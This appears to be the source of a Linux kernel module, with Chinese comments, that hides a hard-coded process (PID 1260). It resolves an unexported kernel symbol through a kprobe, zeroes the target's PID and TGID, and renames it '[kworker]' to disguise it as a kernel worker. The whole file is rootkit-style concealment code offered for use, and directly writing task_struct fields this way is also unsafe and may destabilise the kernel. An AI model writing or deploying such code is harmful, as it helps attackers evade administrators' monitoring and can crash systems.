#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/sched.h>
#include <linux/pid.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/fdtable.h>
#include <linux/dcache.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Kprobe Process Hider");
MODULE_DESCRIPTION("Hide PID 1260 via kprobe-resolved symbols");

/* ---------- 目标 PID ---------- */
#define TARGET_PID 1260

/* ---------- 函数指针类型 ---------- */
typedef struct task_struct *(*find_task_by_vpid_t)(pid_t nr);

/* ---------- 全局函数指针 ---------- */
static find_task_by_vpid_t my_find_task_by_vpid = NULL;

/* ---------- 通过 kprobe 获取符号地址 ---------- */
static unsigned long get_symbol_addr(const char *name)
{
    struct kprobe kp;
    unsigned long addr = 0;
    int ret;
    
    memset(&kp, 0, sizeof(struct kprobe));
    kp.symbol_name = name;
    kp.pre_handler = NULL;
    kp.post_handler = NULL;
    
    ret = register_kprobe(&kp);
    if (ret == 0) {
        addr = (unsigned long)kp.addr;
        unregister_kprobe(&kp);
    }
    
    return addr;
}

/* ---------- 隐藏进程 ---------- */
static void hide_process(void)
{
    struct task_struct *task;
    
    if (!my_find_task_by_vpid) {
        printk(KERN_ERR "find_task_by_vpid not available\n");
        return;
    }
    
    /* 查找目标进程 */
    task = my_find_task_by_vpid(TARGET_PID);
    if (!task) {
        printk(KERN_ERR "Process %d not found\n", TARGET_PID);
        return;
    }
    
    printk(KERN_INFO "Found process: PID=%d, TGID=%d, name=%s\n",
           task->pid, task->tgid, task->comm);
    
    /* 方法1：修改 PID 为 0（ps 会跳过 PID 0） */
    task->pid = 0;
    task->tgid = 0;
    
    /* 方法2：修改进程名，增加混淆 */
    if (task->comm) {
        strcpy(task->comm, "[kworker]");
    }
    
    printk(KERN_INFO "✅ Process %d hidden (PID set to 0, name changed)\n", TARGET_PID);
}

/* ---------- 模块初始化 ---------- */
static int __init hide_pid_init(void)
{
    unsigned long addr;
    
    printk(KERN_INFO "========================================\n");
    printk(KERN_INFO "Process Hider via Kprobe\n");
    printk(KERN_INFO "Target PID: %d\n", TARGET_PID);
    printk(KERN_INFO "========================================\n");
    
    /* 通过 kprobe 获取 find_task_by_vpid */
    addr = get_symbol_addr("find_task_by_vpid");
    if (!addr) {
        printk(KERN_ERR "❌ find_task_by_vpid not found\n");
        return -ENOENT;
    }
    my_find_task_by_vpid = (find_task_by_vpid_t)addr;
    printk(KERN_INFO "✅ find_task_by_vpid = 0x%lx\n", addr);
    
    /* 执行隐藏操作 */
    hide_process();
    
    printk(KERN_INFO "========================================\n");
    printk(KERN_INFO "Process hider loaded successfully\n");
    printk(KERN_INFO "Check: ps -A | grep %d\n", TARGET_PID);
    printk(KERN_INFO "========================================\n");
    
    return 0;
}

/* ---------- 模块退出 ---------- */
static void __exit hide_pid_exit(void)
{
    struct task_struct *task;
    
    /* 恢复进程 PID（可选） */
    if (my_find_task_by_vpid) {
        task = my_find_task_by_vpid(0);  /* PID 0 的进程 */
        if (task && task->pid == 0 && task->tgid == 0) {
            /* 恢复 PID */
            task->pid = TARGET_PID;
            task->tgid = TARGET_PID;
            printk(KERN_INFO "Process restored to PID %d\n", TARGET_PID);
        }
    }
    
    printk(KERN_INFO "Process hider unloaded\n");
}

module_init(hide_pid_init);
module_exit(hide_pid_exit);